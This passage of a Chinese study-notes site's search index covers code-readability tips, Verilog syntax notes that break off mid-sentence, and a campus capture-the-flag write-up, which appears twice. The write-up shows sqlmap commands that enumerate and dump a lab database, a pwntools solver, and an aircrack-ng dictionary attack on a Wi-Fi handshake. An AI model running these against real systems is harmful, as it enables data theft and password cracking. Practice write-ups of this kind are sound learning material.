\u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6bb5\u6709\u8bf8\u591a\u597d\u5904\uff0c\u9996\u5148\u5b83\u5c06\u76f8\u4f3c\u529f\u80fd\u7684\u4ee3\u7801\u653e\u5728\u4e00\u8d77\uff0c\u80fd\u5e2e\u52a9\u7406\u89e3\u4ee3\u7801\u7684\u903b\u8f91\uff0c\u5feb\u901f\u901a\u8bfb\u4ee3\u7801\uff08\u7279\u522b\u662f\u914d\u5408\u6ce8\u91ca\u9605\u8bfb\u65f6\uff09\u3002\u540c\u65f6\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u8bfb\u8005\u5b9a\u4f4d\u81ea\u5df1\u73b0\u5728\u6240\u9605\u8bfb\u7684\u4f4d\u7f6e\u3002\u4ee5\u4e0b\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a def suggest_new_friends ( user , email_password ): # Get the user's friends' email addresses. friends = user . friends (); friends_emails = set ( f . email for f in friends ) # Import all email addresses from this user's email account. contacts = import_contacts ( user . email , email_password ) contact_emails = set ( c . email for c in contacts ) # Find matching users that they aren't already friends with. non_friend_emails = contact_emails - friend_emails suggested_friends = User . objects . select ( email_in = non_friend_emails ) # Display these lists on the page. display [ 'user' ] = user display [ 'friends' ] = friends display [ 'suggested_friends' ] = suggested_friends return render ( \"sugguested_friends.html\" , display )","title":"1.2 \u6392\u7248"},{"location":"misc/code/#13","text":"\u9996\u5148\u6211\u4eec\u9700\u8981\u77e5\u9053\u5728\u54ea\u4e9b\u60c5\u51b5\u4e0b\u662f\u4e0d\u9700\u8981\u6ce8\u91ca\u7684\uff1a \u4e3a\u4e86\u5199\u6ce8\u91ca\u800c\u5199\u6ce8\u91ca\uff0c\u5373\u6ca1\u6709\u63d0\u4f9b\u66f4\u591a\u4fe1\u606f\u7684\u6ce8\u91ca \u4e3a\u89e3\u91ca\u6666\u6da9\u7684\u547d\u540d\u7684\u6ce8\u91ca\u3002\u597d\u4ee3\u7801>\u574f\u4ee3\u7801+\u597d\u6ce8\u91ca \u5728\u5f88\u591a\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u5bf9\u5982\u4f55\u5199\u6ce8\u91ca\u4ecd\u65e0\u4ece\u4e0b\u624b\uff0c\u4f5c\u8005\u7ed9\u51fa\u4e86\u4e00\u4e9b\u7ecf\u5178\u7684\u5e94\u7528\u573a\u666f\u3002 \ud83c\udfdd \u573a\u666f\u4e00\uff1a\u4e3a\u4ee3\u7801\u4e2d\u7684\u7455\u75b5\u5199\u6ce8\u91ca\u3002 \u6807\u8bb0 \u901a\u5e38\u7684\u610f\u4e49 TODO: \u8fd8\u6ca1\u6709\u5904\u7406\u7684\u4e8b\u60c5 FIXME: \u5df2\u77e5\u7684\u65e0\u6cd5\u8fd0\u884c\u7684\u4ee3\u7801 HACK: \u5bf9\u4e00\u4e2a\u95ee\u9898\u4e0d\u5f97\u4e0d\u91c7\u7528\u7684\u6bd4\u8f83\u7c97\u7cd9\u7684\u65b9\u6cd5 // TODO: add connect function \ud83c\udfdd \u573a\u666f\u4e8c\uff1a\u4e3a\u5e38\u91cf\u52a0\u6ce8\u91ca\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6bcf\u4e2a\u5e38\u91cf\u90fd\u6709\u4e00\u4e2a\u8bbe\u7f6e\u4e3a\u8be5\u503c\u7684\u7f18\u7531\u3002 // Impose a reasonable limit - no human can read that much anyway const int MAX_RSS_SUBSCRIPTION = 1000 ; \ud83c\udfdd \u573a\u666f\u4e09\uff1a\u53ef\u80fd\u5f15\u8d77\u6b67\u4e49\u7684\u5730\u65b9\u3002 \ud83c\udfdd \u573a\u666f\u56db\uff1a\u53ef\u80fd\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u3002 \ud83c\udfdd \u573a\u666f\u4e94\uff1a\u603b\u7ed3\u6027\u7684\u6ce8\u91ca\u3002 \u5bf9\u4e8e\u4e00\u4e9b\u4ee3\u7801\u5757\uff0c\u5728\u524d\u9762\u52a0\u4e0a\u6ce8\u91ca\u53ef\u4ee5\u65b9\u6cd5\u8bfb\u8005\u5728\u9605\u8bfb\u4ee3\u7801\u7ec6\u8282\u524d\u6709\u4e00\u4e2a\u603b\u4f53\u7684\u5370\u8c61\u3002\u5c31\u5982\u6392\u7248\u7684\u7b2c\u56db\u4e2a\u65b9\u6cd5\u7684\u4f8b\u5b50\u4e2d\u7684\u5e94\u7528\u90a3\u6837\uff0c\u548c\u4ee3\u7801\u5206\u5757\u914d\u5408\u4f7f\u7528\uff0c\u4f1a\u67091+1>2\u7684\u6548\u679c\u3002","title":"1.3 \u6ce8\u91ca"},{"location":"misc/code/#2","text":"","title":"2 \u7b80\u5316\u5faa\u73af\u903b\u8f91"},{"location":"misc/code/#21","text":"\u2705 \u5efa\u8bae\u4e00\uff1a\u8c03\u6574\u5224\u65ad\u6761\u4ef6\u7684\u5de6\u53f3\u987a\u5e8f \u5bf9\u4e8e\u4ee5\u4e0b\u4e24\u6761\u6307\u4ee4\uff0c\u76f8\u4fe1\u4f60\u4f1a\u66f4\u559c\u6b22\u524d\u8005\u800c\u4e0d\u662f\u540e\u8005\uff0c\u8fd9\u53ef\u80fd\u4e0e\u6211\u4eec\u7684\u601d\u7ef4\u4e60\u60ef\u6709\u5173\u7cfb\u3002\u5728\u7f16\u5199\u4ee3\u7801\u65f6\uff0c\u8bf7\u5c3d\u91cf\u5c06\u5e38\u91cf\u653e\u5728\u53f3\u8fb9\uff0c\u800c\u4f1a\u53d8\u5316\u7684\uff0c\u88ab\u7528\u4e8e\u68c0\u67e5\u3001\u6bd4\u8f83\u7684\u503c\u653e\u5728\u5de6\u8fb9\u3002 // \u53d8\u91cf\u5728\u5de6\uff0c\u5e38\u91cf\u5728\u53f3 if ( length >= 10 ) { // do something } // \u5e38\u91cf\u5728\u5de6\uff0c\u53d8\u91cf\u5728\u53f3 if ( 10 <= length ) { // do something } \u2705 \u5efa\u8bae\u4e8c\uff1a\u8c03\u6574\u6761\u4ef6\u8bed\u53e5\u7684\u524d\u540e\u987a\u5e8f \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u559c\u6b22 \u6b63 \u903b\u8f91\u5927\u4e8e \u8d1f \u903b\u8f91\u3002 // \u6b63\u903b\u8f91 if ( a == b ) { // do somehting } else { // do something } // \u8d1f\u903b\u8f91 if ( a != b ) { // do something } else { // do something } \u5148\u5904\u7406 \u7b80\u5355 \u7684\u903b\u8f91\uff0c\u518d\u5904\u7406 \u590d\u6742 \u7684\u903b\u8f91 \u5f53\u7136\uff0c\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u903b\u8f91\u7684\u590d\u6742\u4e0e\u5426\u548c\u524d\u9762\u7684\u6b63\u8d1f\u903b\u8f91\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u8fdb\u884c\u53d6\u820d\u548c\u8003\u91cf\u4e86\u3002\u4ee5\u4e0b\u5c31\u662f\u4e3a\u5148\u5904\u7406\u91cd\u8981\u7684\u903b\u8f91\u800c\u540c\u65f6\u201c\u8fdd\u80cc\u201d\u7b80\u5355\u903b\u8f91\u539f\u5219\u548c\u6b63\u903b\u8f91\u539f\u5219\u7684\u7ecf\u5178\u4f8b\u5b50\uff1a if not file : # Log the error ... else : # ... \u2705 \u5efa\u8bae\u4e09\uff1a\u8c28\u614e\u4f7f\u7528\u53ef\u80fd\u5f71\u54cd\u53ef\u8bfb\u6027\u7684\u8868\u8fbe\u5f0f\u3002 \u4e09\u76ee\u8fd0\u7b97\u7b26 return exponent >=0 ? mantissa * (1 << exponent) : mantissa / (1 << -exponent); do/while \u5faa\u73af goto \u2705 \u5efa\u8bae\u56db\uff1a\u6700\u5c0f\u5316\u6761\u4ef6\u8bed\u53e5\u5d4c\u5957\u3002 \u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u5728\u524d\u4eba\u57fa\u7840\u4e0a\u8fdb\u884c\u529f\u80fd\u6dfb\u52a0\u65f6\uff0c\u5c31\u5bb9\u6613\u51fa\u73b0\u5728\u8bed\u53e5\u4e2d\u5d4c\u5957\u6761\u4ef6\u8bed\u53e5\uff0c\u4f8b\u5982\u4e0b\u65b9\u65f6\u4ee3\u7801\u539f\u6709\u903b\u8f91\u3002 if ( user_result == SUCCESS ) { reply . WriteErrors ( \"\" ); } else { reply . WriteErrors ( user_result ); } \u540e\u6765\u589e\u52a0\u903b\u8f91\u540e\u53d8\u4e3a\uff1a if ( user_result == SUCCESS ) { if ( permission_result != SUCCESS ) { reply . WriteErrors ( \"error reading permissions\" ); return ; } reply . WriteErrors ( \"\" ); } else { reply . WriteErrors ( user_result ); } \u5b9e\u9645\u4e0a\uff0c\u53ea\u8981\u518d\u7565\u52a0\u601d\u8003\uff0c\u5c31\u80fd\u5c06\u4e0a\u9762\u4e0d\u7f8e\u89c2\u4e14\u96be\u4ee5\u7406\u89e3\u7684\u4ee3\u7801\u903b\u8f91\u7b80\u5316\u3002 if ( user_result != SUCCESS ) { reply . WriteErrors ( user_result ); } else if ( permission_result != SUCCESS ) { reply . WriteErrors ( \"error reading permissions\" ); } else { reply . WriteErrors ( \"\" ); }","title":"2.1 \u4f18\u5316\u63a7\u5236\u6d41"},{"location":"misc/code/#22","text":"\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\u5728 1.2 \u6392\u7248 \u4e2d\u7565\u6709\u63d0\u53ca\uff0c\u8868\u8fbe\u5f0f\u8fc7\u957f\u6709\u4e24\u4e2a\u7f3a\u70b9\uff0c\u4e00\u65b9\u9762\u662f\u4e0d\u591f\u7f8e\u89c2\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u8bfb\u6027\u4e5f\u4e0d\u591f\u5f3a\u3002\u5c31\u5982\u4e0b\u65b9\u4ee3\u7801\uff0c\u5224\u65ad\u6761\u4ef6\u7684\u5de6\u8fb9\u90e8\u5206\u53c8\u662f split \u53c8\u662f strip \uff0c\u542b\u4e49\u5e76\u4e0d\u591f\u6e05\u9664\u660e\u767d\u3002 if line . split ( ':' )[ 0 ] . strip () == \"root\" : # do something elif line . split ( ':' )[ 0 ] . strip () == \"user1\" : # do something \u82e5\u5c06\u88ab\u5224\u65ad\u7684\u503c\u8d4b\u7ed9\u4e00\u4e2a\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u4f7f\u5f97\u5224\u65ad\u6761\u4ef6\u66f4\u52a0\u76f4\u89c2\u53ef\u8bfb\u3002 username = line . split ( ':' )[ 0 ] . strip () if username == \"root\" : # do something elif username == \"user1\" : # do something \u5f53\u7136\u9664\u4e86\u4f7f\u7528 \u53d8\u91cf \u5916\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 \u51fd\u6570 / \u5b8f\u5b9a\u4e49 \u5728\u5408\u9002\u7684\u573a\u666f\u4e2d\u8fbe\u5230\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u7684\u76ee\u7684\u3002","title":"2.2 \u62c6\u5206\u957f\u8868\u8fbe\u5f0f"},{"location":"misc/code/#23","text":"\u5728\u4e0a\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4e3a\u4e86\u589e\u52a0\u4ee3\u7801\u53ef\u8bfb\u6027\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u800c\u589e\u8bbe\u53d8\u91cf\uff0c\u4f46\u662f\u5728\u4ee3\u7801\u53ef\u8bfb\u6027\u4e0d\u53d7\u5f71\u54cd\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5f53\u5c3d\u53ef\u80fd\u5730\u51cf\u5c11\u53d8\u91cf\uff0c\u5e76\u5c3d\u53ef\u80fd\u5730\u4f7f\u7528\u5e38\u91cf\u3002\u5bf9\u4e8e\u4e00\u4e2a\u53d8\u91cf\uff0c\u7f29\u5c0f\u8d77\u4f5c\u7528\u57df\u4e5f\u53ef\u4ee5\u907f\u514d\u5236\u9020\u8fc7\u591a\u7684 bug\u3002 \u6bd4\u5982\u4e0b\u65b9\u4ee3\u7801\uff0c\u82e5 now \u53ea\u5728\u4e00\u4e2a\u5730\u65b9\u7528\u5230\uff0c\u5219\u4e0d\u5982\u5220\u53bb now \u4ee5\u7f29\u51cf\u4e0d\u5fc5\u8981\u7684\u53d8\u91cf\uff0c\u4e14\u8fd9\u6837\u7684\u4f5c\u6cd5\u51e0\u4e4e\u4e0d\u4f1a\u5f71\u54cd\u53ef\u8bfb\u6027\u3002 now = datatime . datetime . now () root_message . last_view_time = now root_message . last_view_time = datatime . datetime . now ()","title":"2.3 \u5408\u7406\u8bbe\u7f6e\u53d8\u91cf"},{"location":"misc/code/#3","text":"\u8be5\u90e8\u5206\u4f1a\u8ba8\u8bba\u53ef\u4ee5\u5728\u51fd\u6570\u7ea7\u522b\u5bf9\u4ee3\u7801\u505a\u66f4\u5927\u7684\u6539\u52a8\uff0c\u5177\u4f53\u6765\u8bb2\uff0c\u6211\u4eec\u4f1a\u8bb2\u5230\u4e09\u79cd\u7ec4\u7ec7\u4ee3\u7801\u7684\u65b9\u6cd5\uff1a \u62bd\u53d6\u51fa\u90a3\u4e9b\u4e0e\u7a0b\u5e8f\u4e3b\u8981\u76ee\u7684\u201c\u4e0d\u76f8\u5173\u7684\u5b50\u95ee\u9898\u201d\u3002 \u91cd\u65b0\u7ec4\u7ec7\u4ee3\u7801\u4f7f\u4ed6\u4e00\u6b21\u53ea\u505a\u4e00\u4ef6\u4e8b\u60c5\u3002 \u5148\u7528\u81ea\u7136\u8bed\u8a00\u63cf\u8ff0\u4ee3\u7801\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u63cf\u8ff0\u6765\u5e2e\u52a9\u4f60\u627e\u5230\u66f4\u6574\u6d01\u7684\u89e3\u51b3\u65b9\u6848\u3002 \u2705 \u5efa\u8bae\u4e00\uff1a\u5206\u79bb\u4ee3\u7801\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c\u5373\u628a\u201c\u4e00\u822c\u4ee3\u7801\u548c\u9879\u76ee\u4e13\u6709\u7684\u4ee3\u7801\u5206\u5f00\u201d\u3002 \u2705 \u5efa\u8bae\u4e8c\uff1a\u4e00\u6b21\u53ea\u505a\u4e00\u4ef6\u4e8b\u3002 \u5c06\u6240\u6709\u8981\u505a\u7684\u4efb\u52a1\u5206\u51fa\u6765\uff0c\u5e76\u8fd9\u4e9b\u4efb\u52a1\u53d8\u6210\u5355\u72ec\u7684\u51fd\u6570\u6291\u6216\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u6bb5\u843d\u3002 \u2705 \u5efa\u8bae\u4e09\uff1a\u5c06\u60f3\u6cd5\u53d8\u6210\u4ee3\u7801\u3002 \u2705 \u5efa\u8bae\u56db\uff1a\u5c11\u4e9b\u4ee3\u7801\u3002 \u5728\u9047\u5230\u95ee\u9898\u65f6\uff0c\u7b2c\u4e00\u53cd\u5e94\u4e0d\u5f53\u662f\u81ea\u5df1\u53bb\u5199\u4e00\u4e2a\u529f\u80fd\u53bb\u89e3\u51b3\u9700\u6c42\u3002\u82e5\u80fd\u8bc9\u8bf8\u73b0\u6709\u7684\u5e93\u6216\u8005\u7cfb\u7edf\u5de5\u5177\u89e3\u51b3\uff0c\u4f7f\u7528\u8fd9\u4e9b\u6210\u719f\u7684\u5de5\u5177\u53ef\u80fd\u8981\u6bd4\u4ece\u5934\u5f00\u59cb\u8bbe\u8ba1\u53ef\u9760\u7684\u591a\u3002","title":"3 \u91cd\u65b0\u7ec4\u7ec7\u4ee3\u7801"},{"location":"misc/schoolbus/","text":"ZJU SchoolBus Writeup Web EasyWeb \u7b2c\u4e00\u5173\uff08.bak\uff09 \u67e5\u770b.bak\u6587\u4ef6 http://10.214.160.13:10000/1.php.bak < html > < head > < meta http-equiv = \"Content-Type\" content = \"text/html; charset=utf-8\" /> < meta http-equiv = \"Content-Language\" content = \"zh-CN\" /> </ head > < body > < div align = \"center\" > < h1 > \u6b22\u8fce\u6765\u5230\u7b2c\u4e00\u5173 </ h1 > </ div > <!-- \u5220\u96641.php.bak --> < a href = \"the2nd.php\" > \u8fdb\u5165\u7b2c\u4e8c\u5173 </ a > </ body > </ html > \u7b2c\u4e8c\u5173\uff08XSS\uff09 \u8de8\u811a\u672c\u6f0f\u6d1eXSS \u76f8\u5173\u9605\u8bfb \u76ee\u524d\u4f7f\u7528chrome\u7834\u89e3\u5931\u8d25\u4e86 \u597d\u50cffirefox\u76f4\u63a5\u7981\u6389\u5f39\u7a97\u53ef\u4ee5\u7ed5\u8fc7\u53bb \u7b2c\u4e09\u5173\uff08\u6d88\u606f\u5934\uff09 \u7f51\u7edc \\(\\to\\) disiguan.php \\(\\to\\) Headers \\(\\to\\) Response Headers(wozaizheli.php) \u7b2c\u56db\u5173 \u5220\u6389\u9009\u4e2d\u884c\u7684display\u5f97\u5230flag SQLinjection \u5728\u540e\u53f0\u6570\u636e\u5e93\u4e2d\u627e\u4e00\u4e2a\u540d\u53ebflag_is_here\u7684\u8868\u91cc\u7684flag SQLMAP\u7684\u4f7f\u7528 \u57fa\u672c\u64cd\u4f5c \u601d\u8def\uff1a\u83b7\u53d6\u6570\u636e\u5e93\u540d\u79f0\uff0c\u5f97\u77e5\u6240\u9700\u8981\u7684\u8868\u540d\uff0c\u83b7\u53d6\u5217\u540d\uff0c\u83b7\u53d6\u6307\u5b9a\u5217\u540d\u5b57\u6bb5 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 --dbs python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 -D aaa_web2 --tables python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 -D aaa_web2 -T flag_is_here --column sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 -D aaa_web2 -T flag_is_here -C \"flag\" --dump PPC calculator \u57fa\u672c\u64cd\u4f5c Description \u7f16\u7a0b\u662f\u6700\u91cd\u8981\u7684\u6280\u80fd\uff0c\u6ca1\u6709\u4e4b\u4e00 \u6211\u5c31\u4e0d\u4fe1\u4f60\u7684\u624b\u901f\u8db3\u591f\u5febhhh nc 10.214.160.13 11002 nc\u662fLinux\u81ea\u5e26\u7684\u5de5\u5177\uff0c\u7528\u4e8e\u4e0e\u670d\u52a1\u5668\u5efa\u7acbsocket\u8fde\u63a5 Solution \u5165\u95e8\u94fe\u63a5 \u6ce8\u610fbytes\u7c7b\u548cstring\u7c7b\u7684\u533a\u522b\u4e0e\u76f8\u4e92\u8f6c\u6362 from pwn import * p = remote ( '10.214.160.13' , 11002 ) p . recvlines ( 7 ) for i in range ( 10 ): s = p . recvuntil ( '=' ) s = bytes . decode ( s ) if i == 0 : s = s [: - 2 ] else : s = s [ 15 : - 2 ] sum = eval ( s ) print ( s ) print ( sum ) sum = str . encode ( str ( sum )) p . sendline ( sum ) s = p . recvlines ( 4 ) print ( s ) WUD1T1 \u5927\u6982\u5c31\u662f\u6839\u636e\u9898\u9762\u7ed9\u51fa\u7684\u4fe1\u606f\u786e\u5b9a\u8eab\u4efd\u8bc1\u7684\u67d0\u51e0\u4f4d\uff0c\u5176\u4ed6\u7684\u66b4\u529b\u679a\u4e3e md5\u52a0\u5bc6 import hashlib def get_md5 ( s ): md = hashlib . md5 () md . update ( s . encode ( 'utf-8' )) return md . hexdigest () Reverse Reverse1 \u4e00\u9053\u7b80\u5355\u7684\u9006\u5411\u9898 flag\u52a0\u5bc6\u5b58\u4e8e\u5185\u5b58\u533a\u5185\uff0c\u4e0eCh\u5f02\u6216\u540e\u53d6\u51fa\u503c using namespace std ; void int2str ( const int & int_temp , string & string_temp ) { char s ; s = ( char ) int_temp ; string_temp = s ; } int main (){ int x ; string s = \"\" ; while ( 1 ){ scanf ( \"%x\" , & x ); x ^= 12 ; printf ( \"%d %c \\n \" , x , ( char ) x ); string c ; int2str ( x , c ); s += c ; cout << s << endl ; } } MISC WUD1T2 aircrack-ng\u649e\u5e93 \u9898\u76ee\u5df2\u7ed9\u51fa\u63e1\u624b\u5305\uff0c\u76f4\u63a5\u7528\u73b0\u6709\u7684\u5b57\u5178\u5e93\u7834\u89e3\u5c31\u884c aircrack-ng -w password.txt crack_zju-01.cap vim .swp\u6587\u4ef6\u590d\u539f vim -r \u590d\u539f\u6587\u4ef6\u540d\uff08\u4e0d\u5e26.swp\uff09","title":"ZJU SchoolBus Writeup"},{"location":"misc/schoolbus/#zju-schoolbus-writeup","text":"Web EasyWeb \u7b2c\u4e00\u5173\uff08.bak\uff09 \u67e5\u770b.bak\u6587\u4ef6 http://10.214.160.13:10000/1.php.bak < html > < head > < meta http-equiv = \"Content-Type\" content = \"text/html; charset=utf-8\" /> < meta http-equiv = \"Content-Language\" content = \"zh-CN\" /> </ head > < body > < div align = \"center\" > < h1 > \u6b22\u8fce\u6765\u5230\u7b2c\u4e00\u5173 </ h1 > </ div > <!-- \u5220\u96641.php.bak --> < a href = \"the2nd.php\" > \u8fdb\u5165\u7b2c\u4e8c\u5173 </ a > </ body > </ html > \u7b2c\u4e8c\u5173\uff08XSS\uff09 \u8de8\u811a\u672c\u6f0f\u6d1eXSS \u76f8\u5173\u9605\u8bfb \u76ee\u524d\u4f7f\u7528chrome\u7834\u89e3\u5931\u8d25\u4e86 \u597d\u50cffirefox\u76f4\u63a5\u7981\u6389\u5f39\u7a97\u53ef\u4ee5\u7ed5\u8fc7\u53bb \u7b2c\u4e09\u5173\uff08\u6d88\u606f\u5934\uff09 \u7f51\u7edc \\(\\to\\) disiguan.php \\(\\to\\) Headers \\(\\to\\) Response Headers(wozaizheli.php) \u7b2c\u56db\u5173 \u5220\u6389\u9009\u4e2d\u884c\u7684display\u5f97\u5230flag SQLinjection \u5728\u540e\u53f0\u6570\u636e\u5e93\u4e2d\u627e\u4e00\u4e2a\u540d\u53ebflag_is_here\u7684\u8868\u91cc\u7684flag SQLMAP\u7684\u4f7f\u7528 \u57fa\u672c\u64cd\u4f5c \u601d\u8def\uff1a\u83b7\u53d6\u6570\u636e\u5e93\u540d\u79f0\uff0c\u5f97\u77e5\u6240\u9700\u8981\u7684\u8868\u540d\uff0c\u83b7\u53d6\u5217\u540d\uff0c\u83b7\u53d6\u6307\u5b9a\u5217\u540d\u5b57\u6bb5 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 --dbs python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 -D aaa_web2 --tables python3 sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 -D aaa_web2 -T flag_is_here --column sqlmap.py -u http://10.214.160.13:10002/?questionid = 0 -D aaa_web2 -T flag_is_here -C \"flag\" --dump PPC calculator \u57fa\u672c\u64cd\u4f5c Description \u7f16\u7a0b\u662f\u6700\u91cd\u8981\u7684\u6280\u80fd\uff0c\u6ca1\u6709\u4e4b\u4e00 \u6211\u5c31\u4e0d\u4fe1\u4f60\u7684\u624b\u901f\u8db3\u591f\u5febhhh nc 10.214.160.13 11002 nc\u662fLinux\u81ea\u5e26\u7684\u5de5\u5177\uff0c\u7528\u4e8e\u4e0e\u670d\u52a1\u5668\u5efa\u7acbsocket\u8fde\u63a5 Solution \u5165\u95e8\u94fe\u63a5 \u6ce8\u610fbytes\u7c7b\u548cstring\u7c7b\u7684\u533a\u522b\u4e0e\u76f8\u4e92\u8f6c\u6362 from pwn import * p = remote ( '10.214.160.13' , 11002 ) p . recvlines ( 7 ) for i in range ( 10 ): s = p . recvuntil ( '=' ) s = bytes . decode ( s ) if i == 0 : s = s [: - 2 ] else : s = s [ 15 : - 2 ] sum = eval ( s ) print ( s ) print ( sum ) sum = str . encode ( str ( sum )) p . sendline ( sum ) s = p . recvlines ( 4 ) print ( s ) WUD1T1 \u5927\u6982\u5c31\u662f\u6839\u636e\u9898\u9762\u7ed9\u51fa\u7684\u4fe1\u606f\u786e\u5b9a\u8eab\u4efd\u8bc1\u7684\u67d0\u51e0\u4f4d\uff0c\u5176\u4ed6\u7684\u66b4\u529b\u679a\u4e3e md5\u52a0\u5bc6 import hashlib def get_md5 ( s ): md = hashlib . md5 () md . update ( s . encode ( 'utf-8' )) return md . hexdigest () Reverse Reverse1 \u4e00\u9053\u7b80\u5355\u7684\u9006\u5411\u9898 flag\u52a0\u5bc6\u5b58\u4e8e\u5185\u5b58\u533a\u5185\uff0c\u4e0eCh\u5f02\u6216\u540e\u53d6\u51fa\u503c using namespace std ; void int2str ( const int & int_temp , string & string_temp ) { char s ; s = ( char ) int_temp ; string_temp = s ; } int main (){ int x ; string s = \"\" ; while ( 1 ){ scanf ( \"%x\" , & x ); x ^= 12 ; printf ( \"%d %c \\n \" , x , ( char ) x ); string c ; int2str ( x , c ); s += c ; cout << s << endl ; } } MISC WUD1T2 aircrack-ng\u649e\u5e93 \u9898\u76ee\u5df2\u7ed9\u51fa\u63e1\u624b\u5305\uff0c\u76f4\u63a5\u7528\u73b0\u6709\u7684\u5b57\u5178\u5e93\u7834\u89e3\u5c31\u884c aircrack-ng -w password.txt crack_zju-01.cap vim .swp\u6587\u4ef6\u590d\u539f vim -r \u590d\u539f\u6587\u4ef6\u540d\uff08\u4e0d\u5e26.swp\uff09","title":"ZJU SchoolBus Writeup"},{"location":"misc/verilog/","text":"Verilog \u8bed\u6cd5\u624b\u518c Info \u56e0\u4e3a\u8981\u5f53 2022-2023 Fall \u8ba1\u7b97\u673a\u7cfb\u7edf\u2161 \u7684\u52a9\u6559\uff0c\u6240\u4ee5\u7279\u5730\u6765\u590d\u4e60\u4e00\u4e0b verilog\u3002 0 \u63a8\u8350\u8d44\u6599 USTC Verilog OJ | \u638c\u63e1 Verilog \u57fa\u7840\u8bed\u6cd5\u4e0e\u6613\u9519\u70b9 Synthesizable Coding of Verilog | \u9605\u8bfb17-31\u9875 1 \u8bed\u6cd5\u8865\u5145 1.1 Case always @( * ) begin case ( sel ) // case \u8bed\u53e5\u4f7f\u7528\u65b9\u6cd5\uff1acase ... endcase 3 'b000 : begin // \u591a\u8bed\u53e5\u4f7f\u7528 begin...end \u5305\u88f9 out = data0 ; end 3 'b001 : out = data1 ; 3 'b010 : out = data2 ; 3 'b011 : out = data3 ; default : out = 4 'b0 ; endcase end 1.2 \u4f4d\u62fc\u63a5 module top_module ( input [ 4 : 0 ] a , b , c , d , e , f , output [ 7 : 0 ] w , x , y , z ); assign { w , x , y , z } = { a , b , c , d , e , f , 2 'b11 }; // \u4f4d\u62fc\u63a5\uff0c\u9700\u4fdd\u6301\u524d\u540e\u4f4d\u5bbd\u4e00\u81f4\u3002 endmodule 1.3 \u5f52\u7ea6\u8fd0\u7b97\u7b26 x1 = & a [ 3 : 0 ] // AND: a[3]&a[2]&a[1]&a[0]. Equivalent to (a[3:0] == 4'hf) x2 = | b [ 3 : 0 ] // OR: b[3]|b[2]|b[1]|b[0]. Equivalent to (b[3:0] != 4'h0) x3 = ^ c [ 2 : 0 ] // XOR: c[2]^c[1]^c[0] 1.4 \u6a21\u5757\u5b9a\u4e49\u53ca\u5176\u5b9e\u4f8b\u5316 \u5728\u5b9a\u4e49\u6a21\u5757\u65f6\uff0c\u6211\u4eec\u4f1a\u5728 \u62ec\u53f7 \u4e2d\u5b9a\u4e49\u6b64\u6a21\u5757\u7684\u8bfb\u53e3\u548c\u5199\u53e3\uff0c\u540c\u65f6\u5728 module...endmodule \u4e2d\u63cf\u8ff0\u6574\u4e2a\u6a21\u5757\u7684\u884c\u4e3a\uff08\u5305\u62ec\u4e00\u4e9b assign \u8bed\u53e5\u3001 always \u5757\uff0c\u6291\u6216\u662f reg \u548c wire \u7684\u7533\u660e\u7b49\u7b49\uff09\u3002 \u5bf9\u4e8e\u6a21\u5757\u7684\u5199\u53e3\uff0c\u4e00\u5171\u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u4e00\u79cd\u662f output reg xxx \uff0c\u4e00\u79cd\u662f output wire xxx \uff08\u4e5f\u53ef\u88ab\u7b80\u5199\u4e3a output xxx \uff09\u3002 1 \u82e5\u5199\u53e3\u5728 always \u8bed\u53e5\u4e2d\u88ab\u8d4b\u503c\uff0c\u5219\u58f0\u660e\u6210 reg \u7c7b\u578b\uff1b \u82e5\u5199\u53e3\u5728 assign \u8bed\u53e5\u4e2d\u88ab\u8d4b\u503c\uff0c\u5219\u58f0\u660e\u6210 wire \u7c7b\u578b\uff08wire \u53ef\u7701\u7565\uff09\u3002 \u5173\u4e8e\u6a21\u5757\u7684\u5b9e\u4f8b\u5316\uff0c\u53ef\u4ee5\u53c2\u8003\u4e0b\u65b9\u4ee3\u7801\u3002 module mod_a ( // \u4e00\u4e2a\u6a21\u5757 output out1 , // \u5199\u53e3 input in1 , // \u8bfb\u53e3 input in2 ); // \u63cf\u8ff0\u6a21\u5757\u884c\u4e3a assign out1 = in1 & in2 ; endmodule module top_module ( // \u9876\u5c42\u6a21\u5757 input a , input b , output out1 ); // \u5b9e\u4f8b\u5316\u6a21\u5757 mod_a\uff0c\u683c\u5f0f\uff1a[\u6a21\u5757\u540d] [\u5b9e\u4f8b\u540d\u79f0]( ); mod_a mod ( . in1 ( a ), // \u5c06 top_module \u7684 a \u4e0e mod_a \u7684 in1 \u8fde\u63a5 . in2 ( b ), . out1 ( out1 ) ); endmodule 2 \u8bed\u6cd5\u533a\u5206 2.1 \u963b\u585e\u8d4b\u503c & \u975e\u963b\u585e\u8d4b\u503c 2 \u5728Verilog\u4e2d\uff0c\u6709\u4e09\u79cd\u8d4b\u503c\u65b9\u5f0f\uff0c\u5206\u522b\u4e3a\uff1a 